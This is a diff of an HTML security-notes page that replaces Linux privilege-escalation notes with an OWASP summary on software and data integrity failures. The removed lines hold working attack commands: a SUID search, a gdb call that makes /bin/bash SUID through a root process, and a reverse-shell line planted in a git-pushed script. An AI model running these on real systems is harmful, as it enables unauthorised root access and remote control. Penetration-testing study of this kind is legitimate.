@@ -64,35 +64,28 @@
 
 
 <!--==================== MAIN ====================-->
-    <main class="main"><article id="e09afef9-e3c5-4561-8c53-accaf51bc1b0" class="page sans"><header><h1 class="page-title">General</h1></header><div class="page-body"><p id="a6a65d10-460f-441a-a572-d3b132cf578d" class=""><strong>Linux Guides:</strong></p><ul id="43b89f22-f7c2-4210-901f-feef06a209dd" class="bulleted-list"><li style="list-style-type:disc"><a href="https://sirensecurity.io/blog/linux-privilege-escalation-resources/"><strong>https://sirensecurity.io/blog/linux-privilege-escalation-resources/</strong></a></li></ul><ul id="74652950-b282-4e7d-a3ba-22174a7b1770" class="bulleted-list"><li style="list-style-type:disc"><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></li></ul><ul id="4349e6cd-0663-4932-90f1-5b9b2b3ef7f8" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Linux - Privilege Escalation.md</a></li></ul><ul id="27e2dc03-2eb7-4e58-a555-072eb39829e0" class="bulleted-list"><li style="list-style-type:disc"><a href="https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist">https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist</a></li></ul><ul id="466c7e7b-4e6c-4e01-913c-8616af9519fb" class="bulleted-list"><li style="list-style-type:disc"><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html">https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html</a></li></ul><p id="bc9e8a75-004f-4ba3-9a1f-0f4ad9460fc6" class="">
-</p><ol type="1" id="e6a80d93-57f0-4ea2-84ce-88c746883269" class="numbered-list" start="1"><li>See what tools are installed that I usually use (which python3, which wget, which curl, which nc, etc. Also uname -a to see kernel version.</li></ol><ol type="1" id="9d12ce07-e776-49a7-9d29-576b6919d836" class="numbered-list" start="2"><li>list out all files in directories such as /tmp, /opt, /mnt, /media, /home,
-/etc/passwd (write perms?), /var/www/ (config files?), numerous times
-just doing this has shown me the path to root that other scripts
-wouldn&#x27;t really find.</li></ol><ol type="1" id="1be35e96-ef94-4198-9e4d-56df1c6b6b84" class="numbered-list" start="3"><li>echo $PATH (anything weird?), cat /etc/crontab (any weird jobs?), sudo -l (any sudo perms?)</li></ol><ol type="1" id="54b49e53-6fec-4845-a891-6dc048f3bfd9" class="numbered-list" start="4"><li>finally, look for SUID perms on files and compare output against <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>find <strong>/</strong> -perm <strong>u=s</strong> -type f 2&gt;/<strong>dev</strong>/<strong>null</strong></li></ol><p id="d72eefda-40aa-4556-8dfc-0cfb5a51e543" class=""><strong>Restricted Bash:</strong></p><ul id="16307862-06bd-4a96-afc4-3a03c25ff591" class="bulleted-list"><li style="list-style-type:disc"><a href="https://0xffsec.com/handbook/shells/restricted-shells/">https://0xffsec.com/handbook/shells/restricted-shells/</a></li></ul><pre id="59903c35-6883-4a0c-b822-1c78491080e2" class="code"><code>#Creating a space in bash terminal
-${IFS}</code></pre><p id="815f4a5f-a701-4169-8262-045c1bbeaf74" class=""><strong>Bash root process escalation:</strong></p><pre id="3778509e-6e43-4a28-9201-9e36bf44ee3c" class="code"><code>developer@faculty:~$ ps faux | grep ^root | grep python3
-root   731   0.0  0.9  26896 18200   Ss   Jul02   0:00 /usr/bin/python3 .....
-developer@faculty:~$ gdb -p 731
-Attaching to process 731
-(gdb) call (void)system(&quot;chmod u+s /bin/bash&quot;)
-quit
-bash -p</code></pre><p id="e4fe4480-b36f-42da-99df-faf8cf0d1026" class=""><strong>Git:</strong></p><pre id="dd784bca-a8cc-408e-87f7-34bfb57f0def" class="code"><code>GIT_SSH_COMMAND=&#x27;ssh -i id_rsa -p 43022&#x27; git clone gituser@0.0.0.0:/git-server
-cd git-server
-kali@kali:~/git-server$ git config --global user.name &quot;kali&quot;
-kali@kali:~/git-server$ git config --global user.email &quot;kali@kali.(none)&quot;
-#
-kali@kali:~/git-server$ echo &quot;sh -i &gt;&amp; /dev/tcp/0.0.0.0/8080 0&gt;&amp;1&quot; &gt;&gt; backups.sh 
-kali@kali:~/git-server$ chmod +x backups.sh
-#
-kali@kali:~/git-server$ GIT_SSH_COMMAND=&#x27;ssh -i ~/id_rsa -p 43022&#x27; git push origin master
-Enumerating objects: 5, done.
-Counting objects: 100% (5/5), done.
-Delta compression using up to 4 threads
-Compressing objects: 100% (3/3), done.
-Writing objects: 100% (3/3), 302 bytes | 302.00 KiB/s, done.
-Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
-To 192.168.120.204:/git-server
-   b50f4e5..0212790  master -&gt; master
-kali@kali:~/git-server$</code></pre><p id="608c6d98-c498-49ab-9615-873e4fe68470" class="">
+    <main class="main"><article id="92a4d050-ff4a-4b75-b2f9-f1df06d39261" class="page sans"><header><h1 class="page-title">8. Software and Data Integrity Failures</h1></header><div class="page-body"><p id="c0224e9c-bcbf-42fd-a6c3-7b312edbc614" class=""><a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/</a></p><p id="ed7f3bc5-4442-4d8f-96c7-0a133d1e2832" class="">
+</p><p id="8f471c6f-ca4f-4abe-8258-d58a28487376" class="">Examples:</p><p id="f204d941-c0bb-4ada-bfcd-779f1e142a3e" class=""><strong>Scenario #1 Update without signing:</strong> Many home routers, set-top
+boxes, device firmware, and others do not verify updates via signed
+firmware. Unsigned firmware is a growing target for attackers and is
+expected to only get worse. This is a major concern as many times there
+is no mechanism to remediate other than to fix in a future version and
+wait for previous versions to age out.</p><p id="03ab6061-bcf9-423f-b7a5-dcaa4e5c2234" class="">
+</p><p id="3c686174-98ce-4bed-81e3-4ecb52d31233" class=""><strong>Scenario #2 SolarWinds malicious update</strong>: Nation-states have been
+known to attack update mechanisms, with a recent notable attack being
+the SolarWinds Orion attack. The company that develops the software had
+secure build and update integrity processes. Still, these were able to
+be subverted, and for several months, the firm distributed a highly
+targeted malicious update to more than 18,000 organizations, of which
+around 100 or so were affected. This is one of the most far-reaching and
+most significant breaches of this nature in history.</p><p id="16304490-6fa3-438f-b1f1-172c221d82ed" class="">
+</p><p id="6eccd5c2-5eb8-488a-a7fd-203bdf385a97" class=""><strong>Scenario #3 Insecure Deserialization:</strong> A React application calls a
+set of Spring Boot microservices. Being functional programmers, they
+tried to ensure that their code is immutable. The solution they came up
+with is serializing the user state and passing it back and forth with
+each request. An attacker notices the &quot;rO0&quot; Java object signature (in base64) and
+uses the Java Serial Killer tool to gain remote code execution on the
+application server.</p><p id="b221ec91-6d94-410d-afb8-604030c6fd23" class=""><strong>Prevention:</strong></p><ul id="2beb49a4-e501-4d94-830c-6ab98fee377d" class="bulleted-list"><li style="list-style-type:disc">Ensure libraries and dependencies are using trusted sources</li></ul><ul id="57ce78fe-b7c7-44e9-b823-59b7ceb06d8f" class="bulleted-list"><li style="list-style-type:disc">implement software supply chain security tool</li></ul><p id="c852d433-81c7-4683-9c52-694ce1a31b03" class="">
 </p></div></article></main></main>
 
     <!--==================== FOOTER ====================-->
